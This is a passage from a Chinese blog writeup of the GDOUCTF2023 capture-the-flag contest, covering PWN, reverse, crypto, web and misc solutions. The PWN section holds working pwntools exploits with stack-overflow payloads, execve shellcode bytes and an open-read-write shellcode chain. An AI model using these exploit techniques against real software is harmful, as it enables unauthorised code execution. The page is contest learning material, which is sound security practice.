<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>GDOUCTF2023 Writeup - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="GDOUCTF2023 Writeup" />
<meta property="og:description" content="序 比赛的时候踩大坑了 &amp; 还得多学啊 &amp; 被带飞了
PWN EASY PWN 能往 s1 写入任意长 payload，覆盖下面的 v5 为一个非零的数就有 flag。
exp 如下：
from pwn import * #p = process(&#39;./easypwn&#39;) p = remote(&#39;node5.anna.nssctf.cn&#39;,28206) context.log_level = &#39;debug&#39; def breakpoint(): gdb.attach(p) pause() #sh=remote(&#39;node4.buuoj.cn&#39;,26013) payload = &#39;a&#39;*(0x1f - 4 &#43; 1) #breakpoint() p.sendline(payload) p.interactive() Shellcode 写进一段 shellcode 后跳去执行。
exp 如下：
from pwn import* #p = process(&#39;./pwn&#39;) p = remote(&#39;node6.anna.nssctf.cn&#39;,28557) context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; def breakpoint(): gdb." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/c3ceb4c25322fe3a5327a448396a0d94/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-17T01:31:17+08:00" />
<meta property="article:modified_time" content="2023-04-17T01:31:17+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">GDOUCTF2023 Writeup</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>序</h2> 
<p>比赛的时候踩大坑了 &amp; 还得多学啊 &amp; 被带飞了<br> <img src="https://images2.imgbox.com/26/a5/WRICv0lw_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="PWN_4"></a>PWN</h2> 
<h3><a id="EASY_PWN_5"></a>EASY PWN</h3> 
<p>能往 s1 写入任意长 payload，覆盖下面的 v5 为一个非零的数就有 flag。</p> 
<p><strong>exp 如下：</strong></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#p = process('./easypwn')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28206</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token keyword">def</span> <span class="token function">breakpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#sh=remote('node4.buuoj.cn',26013)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1f</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment">#breakpoint()</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="Shellcode_26"></a>Shellcode</h3> 
<p>写进一段 shellcode 后跳去执行。</p> 
<p><strong>exp 如下：</strong></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#p = process('./pwn')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28557</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token keyword">def</span> <span class="token function">breakpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

shellcode<span class="token operator">=</span><span class="token string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span>

back <span class="token operator">=</span> <span class="token number">0x6010A0</span>

<span class="token comment">#breakpoint()</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please.\n'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>back<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Let\'s start!\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h3><a id="120_56"></a>真男人下120层</h3> 
<p>逆下代码就知道程序的随机数是可预测的。</p> 
<p>直接按着题目伪代码写了相应生成随机数的 c 程序… 在 shell 那用 nc 连远端，同时执行该程序（手速快点，保证时间戳相同…），然后将程序的输出复制粘贴到 shell 处就好。</p> 
<p><strong>exp 如下：</strong></p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token class-name">time_t</span> v3 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">srand</span><span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">120</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="RANDOM_81"></a>RANDOM</h3> 
<p>程序禁了 execve，没开 NX，有 <strong>‘jmp rsp’</strong> 这么一个 gadget，所以往栈上写的 shellcode 是可执行且能利用到的。</p> 
<p>前面就直接爆破了，反正每次执行都有 101 次循环。进入到 <code>vulnerable()</code> 函数后发送我们的 payload。</p> 
<p>我只打了一次，把握好 shellcode 的长度就行，大致结构是 <strong>shellcode1 + ret + shellcode2</strong>。</p> 
<p>ret 控制程序返回地址，自然是写 ‘jmp rsp’ 的地址了。shellcode1 最长能写 40 字节，在这布置 <strong>orw</strong>。shellcode2 最长能写 16 字节，用来 <strong>抬高栈顶指针</strong> + <strong>跳转执行 orw</strong>。</p> 
<p><strong>exp 如下（这里的 orw_shellcode 只用了 35 字节）：</strong></p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./RANDOM'</span><span class="token punctuation">)</span>
<span class="token comment">#p = remote('node6.anna.nssctf.cn',28510)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./RANDOM'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>

<span class="token keyword">def</span> <span class="token function">breakpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># b *0x400942</span>
<span class="token comment"># breakpoint()</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'num:\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token string">"good guys\n"</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sucess!"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

jmp_rsp <span class="token operator">=</span> <span class="token number">0x40094E</span>

shellcode1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    push 0x67616c66 
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall

    mov edi,eax
    mov rsi,rsp
    sub rsi,50
    xor eax,eax
    syscall

    xor edi,2		#mov dil,1
    mov eax,edi		#mov al,1
    syscall
    '''</span><span class="token punctuation">)</span>

shellcode2 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    sub rsp,48
    jmp rsp
    '''</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> shellcode1<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">'\x90'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> shellcode2
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># pause()</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>记录下。刚开始打远端死活读不到 flag 是因为缺少了：</p> 
<pre><code class="prism language-assembly">sub rsi,50
</code></pre> 
<p>（可以删掉上述 exp 中的 <code>sub rsi,50</code> 后试着调一下…）这段 shellcode 在实现 read 的时候是直接将 flag 往栈顶写的，这就导致了 假如 <strong>flag过长</strong> 的话，会将我写入的 <strong>shellcode1</strong> 覆盖掉很大一部分，然后后面就执行不到 write 了… 狠狠踩坑。</p> 
<p>记录一条 能修改rdx部分数据的 两个字节的指令，要控制 rdx 的值来 read/write 大量数据的时候能用上。</p> 
<pre><code class="prism language-assembly">mov dh,0x100 &gt;&gt; 8
</code></pre> 
<h2><a id="REVERSE_168"></a>REVERSE</h2> 
<h3><a id="Check_Your_Luck_170"></a>Check_Your_Luck</h3> 
<p><strong>by V5nDett4</strong><br> 打开 cpp 文件后可以分析出需要解一个五元一次方程，在网上找一个在线解的网站即可。<br> <img src="https://images2.imgbox.com/6e/a1/oacYHuab_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="TEA_175"></a>TEA</h3> 
<p><strong>by Jasonxjy</strong><br> 魔改tea</p> 
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

int main()
{
    unsigned int const k[4] = { 2233,4455,6677,8899 };
    unsigned int r = 32;
    unsigned int const key[4] = { 2233,4455,6677,8899 };
    uint32_t flag[10];
    uint32_t v[10] = {0x1a800bda,0xf7a6219b,0x491811d8,0xf2013328,0x156c365b,0x3c6eaad8,0x84d4bf28,0xf11a7ee7,0x3313b252,0xdd9fe279};
    int j = 0, n = 0;
    for (int j = 8; j &gt;= 0; j--) {
        unsigned int i = 0;
        unsigned int delta = 256256256, sum = delta * (32+j);
        n = j + 1;
        do {
            i++;
            v[n] -= ((((v[j] &lt;&lt; 4) ^ (v[j] &gt;&gt; 5)) + v[j]) ^ ((key[(sum &gt;&gt; 11) &amp; 3]) + sum));            v[j] -= (((key[sum &amp; 3] + sum) ^ ((v[n] &lt;&lt; 4) ^ (v[n] &gt;&gt; 5)) + v[n]) ^ sum);
            sum -= delta;
        } while (i &lt;= 32);
    }
    printf("解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n", v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7], v[8], v[9]);
    for (int i = 0; i &lt; 10; i++)
    {
        for (int j = 3; j&gt;=0; j--)
        {
            printf("%c", (v[i] &gt;&gt; (j * 8)) &amp; 0xFF);
        }
    }
    return 0;
}
</code></pre> 
<h3><a id="doublegame_214"></a>doublegame</h3> 
<p><strong>by Jasonxjy</strong><br> 纯纯迷宫题，手撸即可</p> 
<p>首先找到flag的格式，然后搞迷宫<br> <img src="https://images2.imgbox.com/54/e2/N3ygiaQ3_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/5a/56/al6bnOlQ_o.png" alt="在这里插入图片描述"></p> 
<p>特别注意一下迷宫修改了一下</p> 
<p>提取出来然后走迷宫就可以了</p> 
<p>md5小写路径+13376013</p> 
<h3><a id="Ls_231"></a>L！s！</h3> 
<p><strong>by Jasonxjy</strong><br> Ida分别打开文件再关闭创建i64文件，分析patched文件，然后用bindiff进行分析<br> <img src="https://images2.imgbox.com/83/ba/qwVJyEAp_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/26/8d/qv1w5GsD_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/18/46/d4MtHMNf_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="CRYPTO_242"></a>CRYPTO</h2> 
<h3><a id="Absolute_Baby_Encrytpion_244"></a>Absolute_Baby_Encrytpion</h3> 
<p><strong>by Aer0Lite</strong><br> 下载后分析得知，加密脚本和加密后的字符串已给出，只要将加密脚本逆回去解出来原来加密前的字符串即可。于是将加密脚本中的 case 与encryptedString.concat 后括号里跟的内容对转即可，再次运行此逆转解密脚本将加密后的字符串输入就去即可输出本题 flag</p> 
<h3><a id="babylua_250"></a>babylua</h3> 
<p><strong>by Jasonxjy</strong><br> 这个题给的是两个lua的代码，md5那个其实就是实现md5所以可以不用细看了，前面的是加密过程，可以了解到先是随机生成了四个字符，然后将其md5编码两次，将得到的十六进制一个字符个字符的与flag做加法，给了我们前十位，这就意味着我们可以通过爆破的方式将md5数字还原，然后还原flag即可</p> 
<pre><code>from hashlib import md5
key='b5e62abe84'
s=[200 ,161 ,198 ,157 ,173 ,169 ,199 ,150 ,105 ,163 ,193 ,175 ,173 ,194 ,135 ,131 ,135 ,225]
flag=''
# for i in range(65,123):
#     for j in range(65,123):
#         for k in range(65,123):
#             for l in range(65,123):
#                 o=chr(i)+chr(j)+chr(k)+chr(l)
#                 a=md5(o.encode()).hexdigest()
#                 b=md5(a.encode()).hexdigest()
#                 if(b[:10]==key):
#                     print(b)
key0='b5e62abe84bc8afbfd97c91a15aa0867'
for i in range(len(s)):
    flag+=chr(s[i]-ord(key0[i]))
print(flag)
#flag{He11o_Lua!!!}
</code></pre> 
<h3><a id="Magic_of_Encoding_277"></a>Magic of Encoding</h3> 
<p><strong>by Jasonxjy</strong><br> 这个题呢其实很简单，只不过做起来很复杂，这一长串密文里面有很多干扰字符，观察一下发现是循环的，首先去除干扰字符，然后发现剩余的是一个压缩包格式的东西，这部分同样存在循环，只留下一组之后解base64就是一个压缩包了，打开压缩包里面就是flag，因为是手动去除的这里就贴个去除后的base64以及flag</p> 
<pre><code>UEsDBBQACAAIAAZUilYAAAAAAAAAACUAAAAVACAATWFnaWMgb2YgRW5jb2RpbmcudHh0VVQNAAdNkTNkTpEzZE2RM2R1eAsAAQT1AQAABBQAAABLy0lMr84wKDCOrzQojc/JzDZOiS/JSI33NUnPTI43L8pMzq7lAgBQSwcIjmX6WicAAAAlAAAAUEsBAhQDFAAIAAgABlSKVo5l+lonAAAAJQAAABUAIAAAAAAAAAAAAKSBAAAAAE1hZ2ljIG9mIEVuY29kaW5nLnR4dFVUDQAHTZEzZE6RM2RNkTNkdXgLAAEE9QEAAAQUAAAAUEsFBgAAAAABAAEAYwAAAIoAAAAAAA==
flag：flag{h0p3_y0u_lik3d_the_M4gic_7rick}
</code></pre> 
<h3><a id="Math_Problem_287"></a>Math Problem</h3> 
<p><strong>by Jasonxjy</strong><br> 这个题可以构造copper还原x，然后按照圆锥曲线公式去得到k倍的p，和n做一个gcd就能得到p了。然后解一下rsa即可得到flag，要注意的是需要调一下copper的参数才能解出x</p> 
<pre><code>from Crypto.Util.number import *
e = 65537
n = 79239019133008902130006198964639844798771408211660544649405418249108104979283858140199725213927656792578582828912684320882248828512464244641351915288069266378046829511827542801945752252863425605946379775869602719406340271702260307900825314967696531175183205977973427572862807386846990514994510850414958255877
c = 45457869965165575324534408050513326739799864850578881475341543330291990558135968254698676312246850389922318827771380881195754151389802803398367341521544667542828862543407738361578535730524976113729406101764290984943061582342991118766322793847422471903811686775249409300301726906738475446634950949059180072008
a = 9303981927028382051386918702900550228062240363697933771286553052631411452412621158116514735706670764224584958899184294505751247393129887316131576567242619
b = 9007779281398842447745292673398186664639261529076471011805234554666556577498532370235883716552696783469143334088312327338274844469338982242193952226631913
y = 970090448249525757357772770885678889252473675418473052487452323704761315577270362842929142427322075233537587085124672615901229826477368779145818623466854
R.&lt;x&gt; = PolynomialRing(Zmod(n))
f=x**3+a*x+b-y**2
f=f.monic()
x0 = f.small_roots(X=2^64, beta=0.4,epsilon=0.01)
print(x0)
x=9757458594430450711
kp=pow(y,2)-b-a*x-x**3
import gmpy2
p=gmpy2.gcd(kp,n)
q=n//p
d=gmpy2.invert(e,(p-1)*(q-1))
m=pow(c,d,n)
print(long_to_bytes(m))
#flag{c4edd6d0-d1b3-cbda-95e3-a323edc35be5}
</code></pre> 
<h2><a id="WEB_316"></a>WEB</h2> 
<h3><a id="hate_eat_snake_317"></a>hate eat snake</h3> 
<p><strong>by Aer0Lite</strong><br> 此题存在 bug，在分析完 snake.js 源代码后试玩了几次游戏，最后一次游戏撞墙之后再按空格欲重新开始便直接弹框得到了 flag，后续思考正确解法应该是放在本地运行，修改特定函数即可。</p> 
<h3><a id="_322"></a>受不了一点</h3> 
<p><strong>by Aer0Lite</strong><br> 第一部分传数组即可绕过，cookie 头在 hackbar 直接添加 cookie=j0k3r 即可，对于 aaa 和 bbb 利用 php 弱类型比较分别传一个整型和字符串进去即可（字符串弱类型比较时只会截取前面的部分），最后的两个 POST 和 GET 的 flag 直接传空值进去即可。<br> <img src="https://images2.imgbox.com/fe/fa/bR5u9HCo_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="EZ_WEB_327"></a>EZ WEB</h3> 
<p><strong>by Aer0Lite</strong><br> F12 查看网页源代码可发现 ‘/src’ 提示，访问后得到 app.py 下载源码，分析 app.py 得知用 PUT 方法访问那一长串后缀即可（具体多少忘记了），在浏览器此网址下 F12 打开调试工具，在网络分析出编辑并重发此包使其访问方式为 PUT，再次查看源码即可得到 flag。</p> 
<h2><a id="MISC_333"></a>MISC</h2> 
<h3><a id="Matryoshka_334"></a>Matryoshka</h3> 
<p><strong>by V5nDett4</strong><br> 纯爆破，脚本如下：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> zipfile

<span class="token keyword">def</span> <span class="token function">evaluate_expression</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    tokens <span class="token operator">=</span> expression<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

  
    result <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tokens<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tokens<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        operator <span class="token operator">=</span> tokens<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        operand <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tokens<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  
        <span class="token keyword">if</span> operator <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> operand
        <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
            result <span class="token operator">-=</span> operand
        <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
            result <span class="token operator">*=</span> operand
        <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">:</span>
            result <span class="token operator">/=</span> operand
        <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'%'</span><span class="token punctuation">:</span>
            result <span class="token operator">%=</span> operand
    <span class="token keyword">return</span> result

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    file_path <span class="token operator">=</span> <span class="token string">"password{}.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1001</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        passwd_content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'zero'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'three'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'four'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'five'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'six'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'seven'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'eight'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nine'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'plus'</span><span class="token punctuation">,</span><span class="token string">' + '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'times'</span><span class="token punctuation">,</span><span class="token string">' * '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'minus'</span><span class="token punctuation">,</span><span class="token string">' - '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'mod'</span><span class="token punctuation">,</span><span class="token string">' % '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+ 0'</span><span class="token punctuation">,</span><span class="token string">' + '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'* 0'</span><span class="token punctuation">,</span><span class="token string">' * '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'- 0'</span><span class="token punctuation">,</span><span class="token string">' - '</span><span class="token punctuation">)</span>
        passwd_content_ec<span class="token operator">=</span>passwd_content_ec<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'% 0'</span><span class="token punctuation">,</span><span class="token string">' % '</span><span class="token punctuation">)</span>
    
        
        passwd_content<span class="token operator">=</span>evaluate_expression<span class="token punctuation">(</span>passwd_content_ec<span class="token punctuation">)</span>
        passwd_content<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>passwd_content<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
        passwd_content<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>passwd_content<span class="token punctuation">)</span>
    
    zip_path <span class="token operator">=</span> <span class="token string">"Matryoshka{}.zip"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1001</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    password1 <span class="token operator">=</span> passwd_content
    password1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span>
    zfile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
